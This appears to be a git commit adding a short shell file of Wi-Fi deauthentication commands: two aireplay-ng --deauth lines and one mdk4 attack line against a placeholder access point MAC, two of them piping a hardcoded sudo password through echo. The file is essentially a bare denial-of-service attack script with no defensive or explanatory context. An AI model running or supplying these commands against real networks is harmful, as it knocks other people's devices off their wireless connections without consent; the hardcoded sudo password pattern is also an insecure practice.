3f52c70cff24b1b1f1d80700b4ec28aab642a9ab
genty2088 <156415513+genty2088@users.noreply.github.com>
2024-01-12 13:39:01 +0200

    Add files via upload

---
+++ macs deauth example.sh
@@ -0,0 +1,12 @@
+
+echo parol | sudo -S sudo aireplay-ng wlan0 -a <MAC> -D --deauth 1
+
+
+sudo aireplay-ng wlan0 -a <MAC> -D --deauth 1
+
+
+echo parol | sudo -S mdk4 wlan0 f -s c -m m <MAC> t -p 1
+
+
+
+
